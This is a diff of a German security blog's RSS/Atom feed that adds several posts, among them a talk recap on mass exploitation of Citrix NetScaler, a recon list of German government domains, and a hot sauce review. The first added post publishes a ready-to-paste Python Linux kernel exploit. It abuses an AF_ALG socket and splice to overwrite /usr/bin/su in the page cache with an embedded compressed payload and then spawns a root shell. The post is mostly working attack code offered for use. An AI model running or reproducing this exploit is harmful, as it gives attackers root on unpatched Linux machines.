@@ -3,12 +3,142 @@
     <title>1337core Blog</title>
     <link href="https://www.1337core.de/blog/feed.xml" rel="self" />
     <link href="https://www.1337core.de/blog" />
-    <updated>2026-02-12T09:22:05+01:00</updated>
+    <updated>2026-05-07T16:19:01+02:00</updated>
     <author>
         <name>Leetcore</name>
     </author>
     <id>https://www.1337core.de/blog</id>
 
+    <entry>
+        <title>Copy Fail Linux Kernel Exploit</title>
+        <author>
+            <name>Leetcore</name>
+        </author>
+        <link href="https://www.1337core.de/blog/copy-fail-linux-kernel-exploit.html"/>
+        <id>https://www.1337core.de/blog/copy-fail-linux-kernel-exploit.html</id>
+            <category term="Root"/>
+            <category term="Linux"/>
+            <category term="Exploit"/>
+
+        <updated>2026-05-07T16:19:01+02:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Durch einen Page Cache Fehler ist es möglich 4 Bytes einer Datei im Page Cache zu ändern und sie danach auszuführen. Damit lässt sich bei su das entsprechende Bit setzen, sodass wir kein Passwort mehr eingeben müssen und direkt root sind. Falls der PoC von copy.fail nicht funktioniert, habe ich hier etwas für eure Zwischenablage. pycode=$(cat &lt;&lt;PY #!/usr/bin/env python3 import os as g,zlib,socket as s def d(x):return bytes.fromhex(x) def c(f,t,c): a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o) try:u.recv(8+t) except:0 f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3")) while i&lt;len(e):c(f,i,e[i:i+4]);i+=4 g.system("su") PY ) echo "$pycode" | python3 &amp;&amp; su Die nächste Capture the Flag Challenges werden deutlich einfacher. 😉
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <p>Durch einen Page Cache Fehler ist es möglich 4 Bytes einer Datei im Page Cache zu ändern und sie danach auszuführen. Damit lässt sich bei su das entsprechende Bit setzen, sodass wir kein Passwort mehr eingeben müssen und direkt root sind.</p>
+<p>Falls der PoC von <a href="https://copy.fail/">copy.fail</a> nicht funktioniert, habe ich hier etwas für eure Zwischenablage.</p>
+<pre class="language-bash"><code>pycode=$(cat &lt;&lt;PY
+#!/usr/bin/env python3
+import os as g,zlib,socket as s
+def d(x):return bytes.fromhex(x)
+def c(f,t,c):
+    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+    try:u.recv(8+t)
+    except:0
+    f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+    while i&lt;len(e):c(f,i,e[i:i+4]);i+=4
+    g.system("su")
+PY
+)
+echo "$pycode" | python3 &amp;&amp; su</code></pre>
+<p>Die nächste Capture the Flag Challenges werden deutlich einfacher. 😉</p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>Hot Ones Saucen getestet</title>
+        <author>
+            <name>Leetcore</name>
+        </author>
+        <link href="https://www.1337core.de/blog/hot-ones-saucen-getestet.html"/>
+        <id>https://www.1337core.de/blog/hot-ones-saucen-getestet.html</id>
+            <category term="YouTube"/>
+
+        <updated>2026-02-19T18:19:17+01:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Wer die Serie "Hot Ones" von YouTube kennt, dem wird der Begriff "Da Bomb" etwas sagen. Bei dieser Show werden berühmte Schauspieler/innen oder Sänger/innen interviewt, während sie scharfe Chicken Wings essen. Es gibt eine Scoville Skala, die den Schärfegrad messen soll. Allerdings bezieht sich die Zahl selbst nur auf die Schärfezutat und nicht auf die Soße selbst. In einer Recherche wurden nun die Soßen (aus Staffel 25) als Gesamtprodukt getestet und hier ist "Da Bomb" deutlich schärfer als die letzten beiden Soßen. Das deckt sich dann auch mit den Reaktionen in den Videos. ;)
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <p>Wer die Serie "Hot Ones" von YouTube kennt, dem wird der Begriff "Da Bomb" etwas sagen. Bei dieser Show werden berühmte Schauspieler/innen oder Sänger/innen interviewt, während sie scharfe Chicken Wings essen.</p>
+<p>Es gibt eine Scoville Skala, die den Schärfegrad messen soll. Allerdings bezieht sich die Zahl selbst nur auf die Schärfezutat und nicht auf die Soße selbst. In einer Recherche wurden nun die Soßen (aus Staffel 25) als Gesamtprodukt getestet und hier ist "Da Bomb" deutlich schärfer als die letzten beiden Soßen.</p>
+<p>Das deckt sich dann auch mit den Reaktionen in den Videos. ;)</p>
+<figure class="post__image post__image--center"><img loading="lazy"  src="https://www.1337core.de/blog/media/posts/17/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube.png" alt="" width="1310" height="737" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://www.1337core.de/blog/media/posts/17/responsive/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-xs.png 300w ,https://www.1337core.de/blog/media/posts/17/responsive/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-sm.png 480w ,https://www.1337core.de/blog/media/posts/17/responsive/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-md.png 768w ,https://www.1337core.de/blog/media/posts/17/responsive/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-lg.png 1024w"></figure>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>Massenhacks: Cyberangriffe in Serie</title>
+        <author>
+            <name>Leetcore</name>
+        </author>
+        <link href="https://www.1337core.de/blog/massenhacks-cyberangriffe-in-serie.html"/>
+        <id>https://www.1337core.de/blog/massenhacks-cyberangriffe-in-serie.html</id>
+            <category term="Speaker"/>
+            <category term="Präsentation"/>
+            <category term="Cybersecurity"/>
+
+        <updated>2026-02-16T09:22:58+01:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Ich war mit einem Partner-Unternehmen auf der IT.con in Saarbrücken. Die IT-Messe im Saarland zum Thema IT und Cybersecurity. Da ich gefragt wurde, ob ich gerne einen Vortrag halten möchte, habe ich relativ schnell auf das Thema Massenhacks festgelegt. Nach einiger Recherche welches Beispiel aktuell aus der Praxis passen würde, entwickelte sich "Massenhacks: Cyberangriffe in Serie" mit aktuellen Beispielen von Sicherheitslücken in Citrix NetScaler. In der Session ging es um die wachsende Professionalisierung von Cyberangriffen und darum, wie aus vereinzelten Attacken längst industrielle Prozesse geworden sind. Angreifer automatisieren ihre Methoden, scannen systematisch ganze IP-Bereiche und nutzen öffentliche Exploits um Schwachstellen&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <p>Ich war mit einem Partner-Unternehmen auf der IT.con in Saarbrücken. Die IT-Messe im Saarland zum Thema IT und Cybersecurity. Da ich gefragt wurde, ob ich gerne einen Vortrag halten möchte, habe ich relativ schnell auf das Thema Massenhacks festgelegt.</p>
+<p>Nach einiger Recherche welches Beispiel aktuell aus der Praxis passen würde, entwickelte sich "Massenhacks: Cyberangriffe in Serie" mit aktuellen Beispielen von Sicherheitslücken in Citrix NetScaler.</p>
+<p>In der Session ging es um die wachsende Professionalisierung von Cyberangriffen und darum, wie aus vereinzelten Attacken längst industrielle Prozesse geworden sind. Angreifer automatisieren ihre Methoden, scannen systematisch ganze IP-Bereiche und nutzen öffentliche Exploits um Schwachstellen gezielt in der Breite auszunutzen.</p>
+<h2 id="oeffentliche-angriffsflaeche">Öffentliche Angriffsfläche</h2>
+<p>Zur Aufklärung gehört die systematische Informationssammlung aus öffentlich zugänglichen Quellen (Data-Leaks, Firmenwebseiten, Subdomain-Listen, erreichbare Dienste etc.), um die Angriffsfläche zu analysieren. Automatisierte Prüfungen können helfen, viele Systeme gleichzeitig auf Konfigurationsfehler und bekannte Schwachstellen zu überprüfen. Ziel der Analyse das Verständnis der Sichtbarkeit und potenziellen Angriffsoberfläche im Internet.</p>
+<p><strong>Disclaimer</strong>: Im Vortrag wurden nur öffentlich erreichbare Informationen gezeigt!</p>
+<p>In einer branchenübergreifenden Analyse wurden insgesamt 12.200 Hostnames untersucht, von denen 4.291 Systeme öffentlich erreichbar waren. Der Fokus lag auf der Erkennung erreichbarer Webdienste, um ein realistisches Bild der externen Angriffsfläche zu gewinnen. Unter den untersuchten Domains befanden sich namhafte Unternehmen aus unterschiedlichen Industriezweigen – etwa zf.com, bosch.de, schaeffler.de, festo.com, freseniusmedicalcare.com und villeroy-boch.de.</p>
+<figure class="post__image"><img loading="lazy"  src="https://www.1337core.de/blog/media/posts/16/Bildschirmfoto-2025-11-09-um-12.15.25-md.webp" alt="" width="768" height="313" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://www.1337core.de/blog/media/posts/16/responsive/Bildschirmfoto-2025-11-09-um-12.15.25-md-xs.webp 300w ,https://www.1337core.de/blog/media/posts/16/responsive/Bildschirmfoto-2025-11-09-um-12.15.25-md-sm.webp 480w ,https://www.1337core.de/blog/media/posts/16/responsive/Bildschirmfoto-2025-11-09-um-12.15.25-md-md.webp 768w ,https://www.1337core.de/blog/media/posts/16/responsive/Bildschirmfoto-2025-11-09-um-12.15.25-md-lg.webp 1024w"></figure>
+<p>Die erreichbare Software könnte nun gezielt nach Schwachstellen durchsucht werden. Dafür haben wir analysiert, welche Sicherheitslücken in den letzten Wochen tatsächlich aktiv ausgenutzt wurden. Das BSI warnte am 08.07.2025 bereits vor der kritische Sicherheitslücke in NetScaler ADC und NetScaler Gateway.</p>
+<blockquote>
+<p>Aufgrund der Medienberichte zu Ausnutzungen der kritischen Schwachstelle CVE-2025-5777, die bereits seit Mitte Juni ausgenutzt werden soll, sollten Betreiber ihre NetScaler auf eine mögliche Kompromittierung mit vorhandenen Indikatoren prüfen, auch dann, wenn zeitnah gepatcht wurde.</p>
+<p><a href="https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2025/2025-254480-1032.html">https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2025/2025-254480-1032.html</a></p>
+</blockquote>
+<p>Durch die Analyse der Angriffsoberfläche konnten wir identifizieren, welche Unternehmen potenziell von dieser Sicherheitslücke betroffen sein könnten. Zudem zeigte sich, dass betroffene Organisationen auch nach einem zeitnah eingespielten Update prüfen sollten, ob bereits eine Kompromittierung stattgefunden hat.</p>
+<p>Bei der Schwachstelle handelt es sich um eine Memory-Disclosure-Schwachstelle. Angreifer können dadurch Teile des Arbeitsspeichers der betroffenen Anwendung auslesen und gezielt nach vertraulichen Informationen wie Session-IDs suchen. Mit diesen Sitzungsdaten ist ein Session-Hijacking möglich — Angreifer könnten sich als bereits eingeloggte Mitarbeitende ausgeben und unmittelbar auf deren Konten und Rechte zugreifen.</p>
+<p>Cybersecurity ist kein statisches Ziel, sondern ein fortlaufender Prozess – und wer die Angreifer verstehen will, muss deren Methoden kennen. Unsere Hacker Attack Simulation erkennt die IT-Infrastruktur selbständig und erkennt auch diese Citrix Schwachstelle.</p>
+<p><a href="https://www.1337core.de/slides/Massenhacks.pdf">Hier ist die Präsentation als PDF (nur meine eigenen Slides).</a></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>Recon Deutschland</title>
+        <author>
+            <name>Leetcore</name>
+        </author>
+        <link href="https://www.1337core.de/blog/recon-deutschland.html"/>
+        <id>https://www.1337core.de/blog/recon-deutschland.html</id>
+            <category term="Security"/>
+            <category term="Analyse"/>
+
+        <updated>2026-02-12T16:29:17+01:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    "Recon Deutschland" ist ein Projekt, bei dem ich systematisch alle Domains der öffentlichen Verwaltung aus Deutschland zusammen suche. Damit lässt sich die IT-Angriffsfläche weitgehend analysieren. Die ursprünglichen Listen der Websites stammen von Wikidata. Dort lassen sich verknüpfte Wikipedia Seiten durchsuchen. Durch den Query Builder kann direkt nach Bundesländer, Landkreise, Städte, Gemeinden und Ortschaften gesucht werden. Aus diesen Ergebnissen lasse ich die Webseite extrahieren. Zusätzlich gibt es eine Liste von Universitäten in Deutschland. Die Domains von öffentlichen Verwaltungsorganen in Deutschland. GitHub: https://github.com/Leetcore/recon-deutschland
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <p>"Recon Deutschland" ist ein Projekt, bei dem ich systematisch alle Domains der öffentlichen Verwaltung aus Deutschland zusammen suche. Damit lässt sich die IT-Angriffsfläche weitgehend analysieren.</p>
+<p dir="auto">Die ursprünglichen Listen der Websites stammen von Wikidata. Dort lassen sich verknüpfte Wikipedia Seiten durchsuchen. Durch den <a href="https://query.wikidata.org/querybuilder/?uselang=de" rel="nofollow">Query Builder</a> kann direkt nach Bundesländer, Landkreise, Städte, Gemeinden und Ortschaften gesucht werden. Aus diesen Ergebnissen lasse ich die Webseite extrahieren. Zusätzlich gibt es eine Liste von Universitäten in Deutschland.</p>
+<div class="markdown-heading" dir="auto">
+<h3 class="heading-element" dir="auto" tabindex="-1">/input/verwaltung.txt</h3>
+<p class="heading-element" dir="auto" tabindex="-1"><span style="color: #a5a7b7; font-family: sans-serif; font-size: inherit; font-weight: 400;">Die Domains von öffentlichen Verwaltungsorganen in Deutschland.</span></p>
+<p dir="auto" tabindex="-1">GitHub: <a href="https://github.com/Leetcore/recon-deutschland">https://github.com/Leetcore/recon-deutschland</a></p>
+</div>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>Passwortleaks der Top 100 Unternehmen in Deutschland!</title>
         <author>
@@ -16,6 +146,9 @@
         </author>
         <link href="https://www.1337core.de/blog/passwortleaks-der-top-100-unternehmen-in-deutschland.html"/>
         <id>https://www.1337core.de/blog/passwortleaks-der-top-100-unternehmen-in-deutschland.html</id>
+            <category term="Security"/>
+            <category term="Passwörter"/>
+            <category term="Analyse"/>
 
         <updated>2025-09-14T21:15:14+02:00</updated>
             <summary type="html">
@@ -147,6 +280,9 @@
         </author>
         <link href="https://www.1337core.de/blog/ninja-hacker-cat-fuer-firefox.html"/>
         <id>https://www.1337core.de/blog/ninja-hacker-cat-fuer-firefox.html</id>
+            <category term="Open Source"/>
+            <category term="Firefox"/>
+            <category term="Erweiterung"/>
 
         <updated>2025-09-14T20:46:53+02:00</updated>
             <summary type="html">
@@ -195,11 +331,12 @@
         </author>
         <link href="https://www.1337core.de/blog/hello-world.html"/>
         <id>https://www.1337core.de/blog/hello-world.html</id>
+            <category term="Blog"/>
 
         <updated>2025-07-18T08:17:19+02:00</updated>
             <summary type="html">
                 <![CDATA[
-                    Oh nein, es ist wieder soweit. Ich habe einen Blog angefangen. Ihr(TM) wisst sicherlich noch - damals - als ich 2008 diesen Security Blog hatte. Das war irgendwann durch (damals) Twitter nicht mehr notwendig, weil der Austausch sowieso schneller ging und irgendwann niemand mehr RSS-Reader hatte. Danke Google fürs Abschalten von Google Reader, du Arsch! Da Twitter nun durch Mastodon ersetzt wurde, funktioniert das mit dem schnelleren Austausch immer noch ganz gut, aber da haben wir das 500 Zeichen Limit. Ordentliche Tutorials lassen sich damit nicht schreiben. Einige Jahre tat sich auch nichts Wildes im Bereich Technologie, sodass es sich&hellip;
+                    Oh nein, es ist wieder soweit. Ich habe einen Blog angefangen. Ihr(TM) wisst sicherlich noch - damals - als ich 2008 diesen Security Blog hatte. Das war irgendwann durch (damals) Twitter nicht mehr notwendig, weil der Austausch sowieso schneller ging und irgendwann niemand mehr RSS-Reader hatte. Danke Google fürs Abschalten von Google Reader, du Arsch! Da Twitter nun durch Mastodon ersetzt wurde, funktioniert das mit dem schnelleren Austausch immer noch ganz gut, aber da haben wir das 500 Zeichen Limit. Ordentliche Tutorials lassen sich damit nicht schreiben und irgendwo muss mein Nerdstuff auch hin. Einige Jahre tat sich auch nichts&hellip;
                 ]]>
             </summary>
         <content type="html">
@@ -214,7 +351,7 @@
   </p>
 
   <p>
-    Da Twitter nun durch Mastodon ersetzt wurde, funktioniert das mit dem schnelleren Austausch immer noch ganz gut, aber da haben wir das 500 Zeichen Limit. Ordentliche Tutorials lassen sich damit nicht schreiben.
+    Da Twitter nun durch Mastodon ersetzt wurde, funktioniert das mit dem schnelleren Austausch immer noch ganz gut, aber da haben wir das 500 Zeichen Limit. Ordentliche Tutorials lassen sich damit nicht schreiben und irgendwo muss mein Nerdstuff auch hin.
   </p>
 
     <h2 id="umgang-mit-technologie">
@@ -230,11 +367,7 @@
   </p>
 
   <p>
-    Also füttert euren lokalen RSS-Reader (ich habe auch noch einen) mit der URL:&nbsp;<a href="https://www.1337core.de/blog/feed.xml">https://www.1337core.de/blog/feed.xml</a>
-  </p>
-
-  <p>
-    
+    Also füttert euren lokalen RSS-Reader (ich habe auch noch einen) mit dieser URL:&nbsp;<a href="https://www.1337core.de/blog/feed.xml">https://www.1337core.de/blog/feed.xml</a>.&nbsp;Ich nutze unter Linux gerade Newsflash. Für Mac gibt es auch noch Reeder. Also lokale einfache RSS-Reader, die sich die Feeds ziehen. Ganz ohne Cloud. Ganz einfache Software.
   </p>
             ]]>
         </content>
